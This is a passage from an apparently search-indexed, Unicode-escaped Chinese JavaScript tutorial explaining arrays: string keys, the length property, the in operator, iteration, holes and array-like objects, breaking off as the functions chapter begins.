\u8fd0\u7b97\u7b26\u4f1a\u8fd4\u56de\u6570\u7ec4\u7684\u7c7b\u578b\u662f object \u3002 1 typeof [ 1 , 2 , 3 ] // \"object\" \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c typeof \u8fd0\u7b97\u7b26\u8ba4\u4e3a\u6570\u7ec4\u7684\u7c7b\u578b\u5c31\u662f\u5bf9\u8c61\u3002 \u6570\u7ec4\u7684\u7279\u6b8a\u6027\u4f53\u73b0\u5728\uff0c\u5b83\u7684\u952e\u540d\u662f\u6309\u6b21\u5e8f\u6392\u5217\u7684\u4e00\u7ec4\u6574\u6570\uff080\uff0c1\uff0c2...\uff09\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; Object . keys ( arr ) // [\"0\", \"1\", \"2\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.keys \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4\u7684\u6240\u6709\u952e\u540d\u3002\u53ef\u4ee5\u770b\u5230\u6570\u7ec4\u7684\u952e\u540d\u5c31\u662f\u6574\u65700\u30011\u30012\u3002 \u7531\u4e8e\u6570\u7ec4\u6210\u5458\u7684\u952e\u540d\u662f\u56fa\u5b9a\u7684\uff08\u9ed8\u8ba4\u603b\u662f0\u30011\u30012...\uff09\uff0c\u56e0\u6b64\u6570\u7ec4\u4e0d\u7528\u4e3a\u6bcf\u4e2a\u5143\u7d20\u6307\u5b9a\u952e\u540d\uff0c\u800c\u5bf9\u8c61\u7684\u6bcf\u4e2a\u6210\u5458\u90fd\u5fc5\u987b\u6307\u5b9a\u952e\u540d\u3002JavaScript \u8bed\u8a00\u89c4\u5b9a\uff0c\u5bf9\u8c61\u7684\u952e\u540d\u4e00\u5f8b\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\uff0c\u6570\u7ec4\u7684\u952e\u540d\u5176\u5b9e\u4e5f\u662f\u5b57\u7b26\u4e32\u3002\u4e4b\u6240\u4ee5\u53ef\u4ee5\u7528\u6570\u503c\u8bfb\u53d6\uff0c\u662f\u56e0\u4e3a\u975e\u5b57\u7b26\u4e32\u7684\u952e\u540d\u4f1a\u88ab\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; arr [ '0' ] // 'a' arr [ 0 ] // 'a' \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u7528\u6570\u503c\u548c\u5b57\u7b26\u4e32\u4f5c\u4e3a\u952e\u540d\uff0c\u7ed3\u679c\u90fd\u80fd\u8bfb\u53d6\u6570\u7ec4\u3002\u539f\u56e0\u662f\u6570\u503c\u952e\u540d\u88ab\u81ea\u52a8\u8f6c\u4e3a\u4e86\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u8fd9\u70b9\u5728\u8d4b\u503c\u65f6\u4e5f\u6210\u7acb\u3002\u4e00\u4e2a\u503c\u603b\u662f\u5148\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u4f5c\u4e3a\u952e\u540d\u8fdb\u884c\u8d4b\u503c\u3002 1 2 3 4 var a = []; a [ 1.00 ] = 6 ; a [ 1 ] // 6 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e 1.00 \u8f6c\u6210\u5b57\u7b26\u4e32\u662f 1 \uff0c\u6240\u4ee5\u901a\u8fc7\u6570\u5b57\u952e 1 \u53ef\u4ee5\u8bfb\u53d6\u503c\u3002 \u4e0a\u4e00\u7ae0\u8bf4\u8fc7\uff0c\u5bf9\u8c61\u6709\u4e24\u79cd\u8bfb\u53d6\u6210\u5458\u7684\u65b9\u6cd5\uff1a\u70b9\u7ed3\u6784\uff08 object.key \uff09\u548c\u65b9\u62ec\u53f7\u7ed3\u6784\uff08 object[key] \uff09\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u6570\u503c\u7684\u952e\u540d\uff0c\u4e0d\u80fd\u4f7f\u7528\u70b9\u7ed3\u6784\u3002 1 2 var arr = [ 1 , 2 , 3 ]; arr .0 // SyntaxError \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c arr.0 \u7684\u5199\u6cd5\u4e0d\u5408\u6cd5\uff0c\u56e0\u4e3a\u5355\u72ec\u7684\u6570\u503c\u4e0d\u80fd\u4f5c\u4e3a\u6807\u8bc6\u7b26\uff08identifier\uff09\u3002\u6240\u4ee5\uff0c\u6570\u7ec4\u6210\u5458\u53ea\u80fd\u7528\u65b9\u62ec\u53f7 arr[0] \u8868\u793a\uff08\u65b9\u62ec\u53f7\u662f\u8fd0\u7b97\u7b26\uff0c\u53ef\u4ee5\u63a5\u53d7\u6570\u503c\uff09\u3002","title":"\u6570\u7ec4\u7684\u672c\u8d28"},{"location":"types/array/#length","text":"\u6570\u7ec4\u7684 length \u5c5e\u6027\uff0c\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u6570\u91cf\u3002 1 [ 'a' , 'b' , 'c' ]. length // 3 JavaScript \u4f7f\u7528\u4e00\u4e2a32\u4f4d\u6574\u6570\uff0c\u4fdd\u5b58\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6570\u7ec4\u6210\u5458\u6700\u591a\u53ea\u6709 4294967295 \u4e2a\uff082 32 - 1\uff09\u4e2a\uff0c\u4e5f\u5c31\u662f\u8bf4 length \u5c5e\u6027\u7684\u6700\u5927\u503c\u5c31\u662f 4294967295\u3002 \u53ea\u8981\u662f\u6570\u7ec4\uff0c\u5c31\u4e00\u5b9a\u6709 length \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u662f\u4e00\u4e2a\u52a8\u6001\u7684\u503c\uff0c\u7b49\u4e8e\u952e\u540d\u4e2d\u7684\u6700\u5927\u6574\u6570\u52a0\u4e0a 1 \u3002 1 2 3 4 5 6 7 8 9 10 11 var arr = [ 'a' , 'b' ]; arr . length // 2 arr [ 2 ] = 'c' ; arr . length // 3 arr [ 9 ] = 'd' ; arr . length // 10 arr [ 1000 ] = 'e' ; arr . length // 1001 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6570\u7ec4\u7684\u6570\u5b57\u952e\u4e0d\u9700\u8981\u8fde\u7eed\uff0c length \u5c5e\u6027\u7684\u503c\u603b\u662f\u6bd4\u6700\u5927\u7684\u90a3\u4e2a\u6574\u6570\u952e\u5927 1 \u3002\u53e6\u5916\uff0c\u8fd9\u4e5f\u8868\u660e\u6570\u7ec4\u662f\u4e00\u79cd\u52a8\u6001\u7684\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u968f\u65f6\u589e\u51cf\u6570\u7ec4\u7684\u6210\u5458\u3002 length \u5c5e\u6027\u662f\u53ef\u5199\u7684\u3002\u5982\u679c\u4eba\u4e3a\u8bbe\u7f6e\u4e00\u4e2a\u5c0f\u4e8e\u5f53\u524d\u6210\u5458\u4e2a\u6570\u7684\u503c\uff0c\u8be5\u6570\u7ec4\u7684\u6210\u5458\u6570\u91cf\u4f1a\u81ea\u52a8\u51cf\u5c11\u5230 length \u8bbe\u7f6e\u7684\u503c\u3002 1 2 3 4 5 var arr = [ 'a' , 'b' , 'c' ]; arr . length // 3 arr . length = 2 ; arr // [\"a\", \"b\"] \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5f53\u6570\u7ec4\u7684 length \u5c5e\u6027\u8bbe\u4e3a2\uff08\u5373\u6700\u5927\u7684\u6574\u6570\u952e\u53ea\u80fd\u662f1\uff09\u90a3\u4e48\u6574\u6570\u952e2\uff08\u503c\u4e3a c \uff09\u5c31\u5df2\u7ecf\u4e0d\u5728\u6570\u7ec4\u4e2d\u4e86\uff0c\u88ab\u81ea\u52a8\u5220\u9664\u4e86\u3002 \u6e05\u7a7a\u6570\u7ec4\u7684\u4e00\u4e2a\u6709\u6548\u65b9\u6cd5\uff0c\u5c31\u662f\u5c06 length \u5c5e\u6027\u8bbe\u4e3a0\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; arr . length = 0 ; arr // [] \u5982\u679c\u4eba\u4e3a\u8bbe\u7f6e length \u5927\u4e8e\u5f53\u524d\u5143\u7d20\u4e2a\u6570\uff0c\u5219\u6570\u7ec4\u7684\u6210\u5458\u6570\u91cf\u4f1a\u589e\u52a0\u5230\u8fd9\u4e2a\u503c\uff0c\u65b0\u589e\u7684\u4f4d\u7f6e\u90fd\u662f\u7a7a\u4f4d\u3002 1 2 3 4 var a = [ 'a' ]; a . length = 3 ; a [ 1 ] // undefined \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5f53 length \u5c5e\u6027\u8bbe\u4e3a\u5927\u4e8e\u6570\u7ec4\u4e2a\u6570\u65f6\uff0c\u8bfb\u53d6\u65b0\u589e\u7684\u4f4d\u7f6e\u90fd\u4f1a\u8fd4\u56de undefined \u3002 \u5982\u679c\u4eba\u4e3a\u8bbe\u7f6e length \u4e3a\u4e0d\u5408\u6cd5\u7684\u503c\uff0cJavaScript \u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u8bbe\u7f6e\u8d1f\u503c []. length = - 1 // RangeError: Invalid array length // \u6570\u7ec4\u5143\u7d20\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e2\u768432\u6b21\u65b9 []. length = Math . pow ( 2 , 32 ) // RangeError: Invalid array length // \u8bbe\u7f6e\u5b57\u7b26\u4e32 []. length = 'abc' // RangeError: Invalid array length \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u6570\u7ec4\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u5bf9\u8c61\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e3a\u6570\u7ec4\u6dfb\u52a0\u5c5e\u6027\uff0c\u4f46\u662f\u8fd9\u4e0d\u5f71\u54cd length \u5c5e\u6027\u7684\u503c\u3002 1 2 3 4 5 6 7 var a = []; a [ 'p' ] = 'abc' ; a . length // 0 a [ 2.1 ] = 'abc' ; a . length // 0 \u4e0a\u9762\u4ee3\u7801\u5c06\u6570\u7ec4\u7684\u952e\u5206\u522b\u8bbe\u4e3a\u5b57\u7b26\u4e32\u548c\u5c0f\u6570\uff0c\u7ed3\u679c\u90fd\u4e0d\u5f71\u54cd length \u5c5e\u6027\u3002\u56e0\u4e3a\uff0c length \u5c5e\u6027\u7684\u503c\u5c31\u662f\u7b49\u4e8e\u6700\u5927\u7684\u6570\u5b57\u952e\u52a01\uff0c\u800c\u8fd9\u4e2a\u6570\u7ec4\u6ca1\u6709\u6574\u6570\u952e\uff0c\u6240\u4ee5 length \u5c5e\u6027\u4fdd\u6301\u4e3a 0 \u3002 \u5982\u679c\u6570\u7ec4\u7684\u952e\u540d\u662f\u6dfb\u52a0\u8d85\u51fa\u8303\u56f4\u7684\u6570\u503c\uff0c\u8be5\u952e\u540d\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var arr = []; arr [ - 1 ] = 'a' ; arr [ Math . pow ( 2 , 32 )] = 'b' ; arr . length // 0 arr [ - 1 ] // \"a\" arr [ 4294967296 ] // \"b\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u4e3a\u6570\u7ec4 arr \u6dfb\u52a0\u4e86\u4e24\u4e2a\u4e0d\u5408\u6cd5\u7684\u6570\u5b57\u952e\uff0c\u7ed3\u679c length \u5c5e\u6027\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002\u8fd9\u4e9b\u6570\u5b57\u952e\u90fd\u53d8\u6210\u4e86\u5b57\u7b26\u4e32\u952e\u540d\u3002\u6700\u540e\u4e24\u884c\u4e4b\u6240\u4ee5\u4f1a\u53d6\u5230\u503c\uff0c\u662f\u56e0\u4e3a\u53d6\u952e\u503c\u65f6\uff0c\u6570\u5b57\u952e\u540d\u4f1a\u9ed8\u8ba4\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002","title":"length \u5c5e\u6027"},{"location":"types/array/#in","text":"\u68c0\u67e5\u67d0\u4e2a\u952e\u540d\u662f\u5426\u5b58\u5728\u7684\u8fd0\u7b97\u7b26 in \uff0c\u9002\u7528\u4e8e\u5bf9\u8c61\uff0c\u4e5f\u9002\u7528\u4e8e\u6570\u7ec4\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; 2 in arr // true '2' in arr // true 4 in arr // false \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c\u6570\u7ec4\u5b58\u5728\u952e\u540d\u4e3a 2 \u7684\u952e\u3002\u7531\u4e8e\u952e\u540d\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6570\u503c 2 \u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u6570\u7ec4\u7684\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u4f4d\uff0c in \u8fd0\u7b97\u7b26\u8fd4\u56de false \u3002 1 2 3 4 5 var arr = []; arr [ 100 ] = 'a' ; 100 in arr // true 1 in arr // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4 arr \u53ea\u6709\u4e00\u4e2a\u6210\u5458 arr[100] \uff0c\u5176\u4ed6\u4f4d\u7f6e\u7684\u952e\u540d\u90fd\u4f1a\u8fd4\u56de false \u3002","title":"in \u8fd0\u7b97\u7b26"},{"location":"types/array/#forin","text":"for...in \u5faa\u73af\u4e0d\u4ec5\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u904d\u5386\u6570\u7ec4\uff0c\u6bd5\u7adf\u6570\u7ec4\u53ea\u662f\u4e00\u79cd\u7279\u6b8a\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 var a = [ 1 , 2 , 3 ]; for ( var i in a ) { console . log ( a [ i ]); } // 1 // 2 // 3 \u4f46\u662f\uff0c for...in \u4e0d\u4ec5\u4f1a\u904d\u5386\u6570\u7ec4\u6240\u6709\u7684\u6570\u5b57\u952e\uff0c\u8fd8\u4f1a\u904d\u5386\u975e\u6570\u5b57\u952e\u3002 1 2 3 4 5 6 7 8 9 10 var a = [ 1 , 2 , 3 ]; a . foo = true ; for ( var key in a ) { console . log ( key ); } // 0 // 1 // 2 // foo \u4e0a\u9762\u4ee3\u7801\u5728\u904d\u5386\u6570\u7ec4\u65f6\uff0c\u4e5f\u904d\u5386\u5230\u4e86\u975e\u6574\u6570\u952e foo \u3002\u6240\u4ee5\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528 for...in \u904d\u5386\u6570\u7ec4\u3002 \u6570\u7ec4\u7684\u904d\u5386\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 for \u5faa\u73af\u6216 while \u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var a = [ 1 , 2 , 3 ]; // for\u5faa\u73af for ( var i = 0 ; i < a . length ; i ++ ) { console . log ( a [ i ]); } // while\u5faa\u73af var i = 0 ; while ( i < a . length ) { console . log ( a [ i ]); i ++ ; } var l = a . length ; while ( l -- ) { console . log ( a [ l ]); } \u4e0a\u9762\u4ee3\u7801\u662f\u4e09\u79cd\u904d\u5386\u6570\u7ec4\u7684\u5199\u6cd5\u3002\u6700\u540e\u4e00\u79cd\u5199\u6cd5\u662f\u9006\u5411\u904d\u5386\uff0c\u5373\u4ece\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5411\u7b2c\u4e00\u4e2a\u5143\u7d20\u904d\u5386\u3002 \u6570\u7ec4\u7684 forEach \u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6570\u7ec4\uff0c\u8be6\u89c1\u300a\u6807\u51c6\u5e93\u300b\u7684 Array \u5bf9\u8c61\u4e00\u7ae0\u3002 1 2 3 4 5 6 7 var colors = [ 'red' , 'green' , 'blue' ]; colors . forEach ( function ( color ) { console . log ( color ); }); // red // green // blue","title":"for...in \u5faa\u73af\u548c\u6570\u7ec4\u7684\u904d\u5386"},{"location":"types/array/#_4","text":"\u5f53\u6570\u7ec4\u7684\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u5143\u7d20\uff0c\u5373\u4e24\u4e2a\u9017\u53f7\u4e4b\u95f4\u6ca1\u6709\u4efb\u4f55\u503c\uff0c\u6211\u4eec\u79f0\u8be5\u6570\u7ec4\u5b58\u5728\u7a7a\u4f4d\uff08hole\uff09\u3002 1 2 var a = [ 1 , , 1 ]; a . length // 3 \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c\u6570\u7ec4\u7684\u7a7a\u4f4d\u4e0d\u5f71\u54cd length \u5c5e\u6027\u3002\u867d\u7136\u8fd9\u4e2a\u4f4d\u7f6e\u6ca1\u6709\u503c\uff0c\u5f15\u64ce\u4f9d\u7136\u8ba4\u4e3a\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u6709\u6548\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u9762\u6709\u9017\u53f7\uff0c\u5e76\u4e0d\u4f1a\u4ea7\u751f\u7a7a\u4f4d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u6ca1\u6709\u8fd9\u4e2a\u9017\u53f7\uff0c\u7ed3\u679c\u90fd\u662f\u4e00\u6837\u7684\u3002 1 2 3 4 var a = [ 1 , 2 , 3 ,]; a . length // 3 a // [1, 2, 3] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u6700\u540e\u4e00\u4e2a\u6210\u5458\u540e\u9762\u6709\u4e00\u4e2a\u9017\u53f7\uff0c\u8fd9\u4e0d\u5f71\u54cd length \u5c5e\u6027\u7684\u503c\uff0c\u4e0e\u6ca1\u6709\u8fd9\u4e2a\u9017\u53f7\u65f6\u6548\u679c\u4e00\u6837\u3002 \u6570\u7ec4\u7684\u7a7a\u4f4d\u662f\u53ef\u4ee5\u8bfb\u53d6\u7684\uff0c\u8fd4\u56de undefined \u3002 1 2 var a = [, , ,]; a [ 1 ] // undefined \u4f7f\u7528 delete \u547d\u4ee4\u5220\u9664\u4e00\u4e2a\u6570\u7ec4\u6210\u5458\uff0c\u4f1a\u5f62\u6210\u7a7a\u4f4d\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5f71\u54cd length \u5c5e\u6027\u3002 1 2 3 4 5 var a = [ 1 , 2 , 3 ]; delete a [ 1 ]; a [ 1 ] // undefined a . length // 3 \u4e0a\u9762\u4ee3\u7801\u7528 delete \u547d\u4ee4\u5220\u9664\u4e86\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u5c31\u5f62\u6210\u4e86\u7a7a\u4f4d\uff0c\u4f46\u662f\u5bf9 length \u5c5e\u6027\u6ca1\u6709\u5f71\u54cd\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c length \u5c5e\u6027\u4e0d\u8fc7\u6ee4\u7a7a\u4f4d\u3002\u6240\u4ee5\uff0c\u4f7f\u7528 length \u5c5e\u6027\u8fdb\u884c\u6570\u7ec4\u904d\u5386\uff0c\u4e00\u5b9a\u8981\u975e\u5e38\u5c0f\u5fc3\u3002 \u6570\u7ec4\u7684\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u4f4d\uff0c\u4e0e\u67d0\u4e2a\u4f4d\u7f6e\u662f undefined \uff0c\u662f\u4e0d\u4e00\u6837\u7684\u3002\u5982\u679c\u662f\u7a7a\u4f4d\uff0c\u4f7f\u7528\u6570\u7ec4\u7684 forEach \u65b9\u6cd5\u3001 for...in \u7ed3\u6784\u3001\u4ee5\u53ca Object.keys \u65b9\u6cd5\u8fdb\u884c\u904d\u5386\uff0c\u7a7a\u4f4d\u90fd\u4f1a\u88ab\u8df3\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var a = [, , ,]; a . forEach ( function ( x , i ) { console . log ( i + '. ' + x ); }) // \u4e0d\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa for ( var i in a ) { console . log ( i ); } // \u4e0d\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa Object . keys ( a ) // [] \u5982\u679c\u67d0\u4e2a\u4f4d\u7f6e\u662f undefined \uff0c\u904d\u5386\u7684\u65f6\u5019\u5c31\u4e0d\u4f1a\u88ab\u8df3\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var a = [ undefined , undefined , undefined ]; a . forEach ( function ( x , i ) { console . log ( i + '. ' + x ); }); // 0. undefined // 1. undefined // 2. undefined for ( var i in a ) { console . log ( i ); } // 0 // 1 // 2 Object . keys ( a ) // ['0', '1', '2'] \u8fd9\u5c31\u662f\u8bf4\uff0c\u7a7a\u4f4d\u5c31\u662f\u6570\u7ec4\u6ca1\u6709\u8fd9\u4e2a\u5143\u7d20\uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u904d\u5386\u5230\uff0c\u800c undefined \u5219\u8868\u793a\u6570\u7ec4\u6709\u8fd9\u4e2a\u5143\u7d20\uff0c\u503c\u662f undefined \uff0c\u6240\u4ee5\u904d\u5386\u4e0d\u4f1a\u8df3\u8fc7\u3002","title":"\u6570\u7ec4\u7684\u7a7a\u4f4d"},{"location":"types/array/#_5","text":"\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u952e\u540d\u90fd\u662f\u6b63\u6574\u6570\u6216\u96f6\uff0c\u5e76\u4e14\u6709 length \u5c5e\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u5f88\u50cf\u6570\u7ec4\uff0c\u8bed\u6cd5\u4e0a\u79f0\u4e3a\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\uff08array-like object\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { 0 : 'a' , 1 : 'b' , 2 : 'c' , length : 3 }; obj [ 0 ] // 'a' obj [ 1 ] // 'b' obj . length // 3 obj . push ( 'd' ) // TypeError: obj.push is not a function \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u5c31\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u5e76\u4e0d\u662f\u6570\u7ec4\uff0c\u56e0\u4e3a\u5b83\u4eec\u4e0d\u5177\u5907\u6570\u7ec4\u7279\u6709\u7684\u65b9\u6cd5\u3002\u5bf9\u8c61 obj \u6ca1\u6709\u6570\u7ec4\u7684 push \u65b9\u6cd5\uff0c\u4f7f\u7528\u8be5\u65b9\u6cd5\u5c31\u4f1a\u62a5\u9519\u3002 \u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u7684\u6839\u672c\u7279\u5f81\uff0c\u5c31\u662f\u5177\u6709 length \u5c5e\u6027\u3002\u53ea\u8981\u6709 length \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u7c7b\u4f3c\u4e8e\u6570\u7ec4\u3002\u4f46\u662f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u79cd length \u5c5e\u6027\u4e0d\u662f\u52a8\u6001\u503c\uff0c\u4e0d\u4f1a\u968f\u7740\u6210\u5458\u7684\u53d8\u5316\u800c\u53d8\u5316\u3002 1 2 3 4 5 var obj = { length : 0 }; obj [ 3 ] = 'd' ; obj . length // 0 \u4e0a\u9762\u4ee3\u7801\u4e3a\u5bf9\u8c61 obj \u6dfb\u52a0\u4e86\u4e00\u4e2a\u6570\u5b57\u952e\uff0c\u4f46\u662f length \u5c5e\u6027\u6ca1\u53d8\u3002\u8fd9\u5c31\u8bf4\u660e\u4e86 obj \u4e0d\u662f\u6570\u7ec4\u3002 \u5178\u578b\u7684\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u662f\u51fd\u6570\u7684 arguments \u5bf9\u8c61\uff0c\u4ee5\u53ca\u5927\u591a\u6570 DOM \u5143\u7d20\u96c6\uff0c\u8fd8\u6709\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // arguments\u5bf9\u8c61 function args () { return arguments } var arrayLike = args ( 'a' , 'b' ); arrayLike [ 0 ] // 'a' arrayLike . length // 2 arrayLike instanceof Array // false // DOM\u5143\u7d20\u96c6 var elts = document . getElementsByTagName ( 'h3' ); elts . length // 3 elts instanceof Array // false // \u5b57\u7b26\u4e32 'abc' [ 1 ] // 'b' 'abc' . length // 3 'abc' instanceof Array // false \u4e0a\u9762\u4ee3\u7801\u5305\u542b\u4e09\u4e2a\u4f8b\u5b50\uff0c\u5b83\u4eec\u90fd\u4e0d\u662f\u6570\u7ec4\uff08 instanceof \u8fd0\u7b97\u7b26\u8fd4\u56de false \uff09\uff0c\u4f46\u662f\u770b\u4e0a\u53bb\u90fd\u975e\u5e38\u50cf\u6570\u7ec4\u3002 \u6570\u7ec4\u7684 slice \u65b9\u6cd5\u53ef\u4ee5\u5c06\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u53d8\u6210\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 var arr = Array . prototype . slice . call ( arrayLike ); \u9664\u4e86\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u8fd8\u6709\u4e00\u4e2a\u529e\u6cd5\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u901a\u8fc7 call() \u628a\u6570\u7ec4\u7684\u65b9\u6cd5\u653e\u5230\u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 function print ( value , index ) { console . log ( index + ' : ' + value ); } Array . prototype . forEach . call ( arrayLike , print ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c arrayLike \u4ee3\u8868\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u672c\u6765\u662f\u4e0d\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684 forEach() \u65b9\u6cd5\u7684\uff0c\u4f46\u662f\u901a\u8fc7 call() \uff0c\u53ef\u4ee5\u628a forEach() \u5ac1\u63a5\u5230 arrayLike \u4e0a\u9762\u8c03\u7528\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u5c31\u662f\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u5728 arguments \u5bf9\u8c61\u4e0a\u9762\u8c03\u7528 forEach \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // forEach \u65b9\u6cd5 function logArgs () { Array . prototype . forEach . call ( arguments , function ( elem , i ) { console . log ( i + '. ' + elem ); }); } // \u7b49\u540c\u4e8e for \u5faa\u73af function logArgs () { for ( var i = 0 ; i < arguments . length ; i ++ ) { console . log ( i + '. ' + arguments [ i ]); } } \u5b57\u7b26\u4e32\u4e5f\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u4e5f\u53ef\u4ee5\u7528 Array.prototype.forEach.call \u904d\u5386\u3002 1 2 3 4 5 6 Array . prototype . forEach . call ( 'abc' , function ( chr ) { console . log ( chr ); }); // a // b // c \u6ce8\u610f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6bd4\u76f4\u63a5\u4f7f\u7528\u6570\u7ec4\u539f\u751f\u7684 forEach \u8981\u6162\uff0c\u6240\u4ee5\u6700\u597d\u8fd8\u662f\u5148\u5c06\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u7136\u540e\u518d\u76f4\u63a5\u8c03\u7528\u6570\u7ec4\u7684 forEach \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 var arr = Array . prototype . slice . call ( 'abc' ); arr . forEach ( function ( chr ) { console . log ( chr ); }); // a // b // c","title":"\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61"},{"location":"types/array/#_6","text":"Axel Rauschmayer, Arrays in JavaScript Axel Rauschmayer, JavaScript: sparse arrays vs. dense arrays Felix Bohm, What They Didn\u2019t Tell You About ES5\u2032s Array Extras Juriy Zaytsev, How ECMAScript 5 still does not allow to subclass an array","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"types/function/","text":"\u51fd\u6570 \u00b6 \u51fd\u6570\u662f\u4e00\u6bb5\u53ef\u4ee5\u53cd\u590d\u8c03\u7528\u7684\u4ee3\u7801\u5757\u3002\u51fd\u6570\u8fd8\u80fd\u63a5\u53d7\u8f93\u5165\u7684\u53c2\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u503c\u3002 \u6982\u8ff0 \u00b6 \u51fd\u6570\u7684\u58f0\u660e \u00b6 JavaScript \u6709\u4e09\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u6cd5\u3002 \uff081\uff09function \u547d\u4ee4 function 